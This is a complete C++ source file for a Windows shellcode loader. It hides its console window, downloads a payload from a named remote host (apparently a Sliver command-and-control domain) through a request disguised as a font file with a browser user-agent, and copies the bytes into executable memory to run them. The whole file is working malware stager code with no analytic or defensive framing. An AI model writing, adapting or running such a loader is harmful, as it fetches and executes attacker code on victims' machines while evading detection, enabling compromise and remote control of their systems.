#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment (lib, "Wininet.lib")


struct Shellcode {
	byte* data;
	DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port);
void Execute(Shellcode shellcode);

int main() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window

	Shellcode shellcode = Download(L"sliver.nosfera0x2.com", 80);
	Execute(shellcode);

	return 0;
}

Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET connection = InternetConnect(
		session,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET request = HttpOpenRequest(
		connection,
		L"GET",
		L"/fontawesome.woff",
		NULL,
		NULL,
		NULL,
		0,
		0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
		//printf("Error sending HTTP request: : (%lu)\n", GetLastError()); // only for debugging

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0); // HTTP requests eventually failed
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			//printf("Error reading internet file : <%lu>\n", GetLastError()); // only for debugging
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	byte* newPayload = (byte*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	struct Shellcode out;
	out.data = payload;
	out.len = payloadSize;
	return out;
}

void Execute(Shellcode shellcode) {
	void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode.data, shellcode.len);
	((void(*)())exec)();
}
